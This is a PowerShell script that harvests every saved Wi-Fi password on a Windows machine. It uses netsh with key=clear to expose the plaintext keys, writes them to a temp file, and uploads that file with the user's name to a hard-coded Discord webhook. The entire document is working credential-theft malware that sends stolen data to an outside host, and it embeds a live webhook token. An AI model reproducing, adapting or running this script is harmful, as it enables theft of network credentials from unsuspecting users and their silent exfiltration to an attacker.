# Retrieve and saved Wi-Fi passwords
$wifiProfiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ SSID_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize | Out-String
$wifiProfiles > $env:TEMP/--wifi-pass.txt

############################################################################################################################################################

# Define the DC
$dc = "https://discord.com/api/webhooks/1312707510041313300/HvHFy7R6oZfoKCg2f92j0bG5CuMa4Pivwi_JR9xQoKzVC7sKbX02X-SFq5f7_1GbGNol"

############################################################################################################################################################

# Function to upload Wi-Fi passwords to Discord
function Upload-Discord {

[CmdletBinding()]
param (
    [parameter(Position=0, Mandatory=$False)]
    [string]$file,
    [parameter(Position=1, Mandatory=$False)]
    [string]$text 
)

$hookurl = "$dc"

$Body = @{
  'username' = $env:username
  'content' = $text
}

if (-not ([string]::IsNullOrEmpty($text))) {
    Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl -Method Post -Body ($Body | ConvertTo-Json)
}

if (-not ([string]::IsNullOrEmpty($file))) {
    curl.exe -F "file1=@$file" $hookurl
}
}

if (-not ([string]::IsNullOrEmpty($dc))) { 
    Upload-Discord -file "$env:TEMP/--wifi-pass.txt"
}
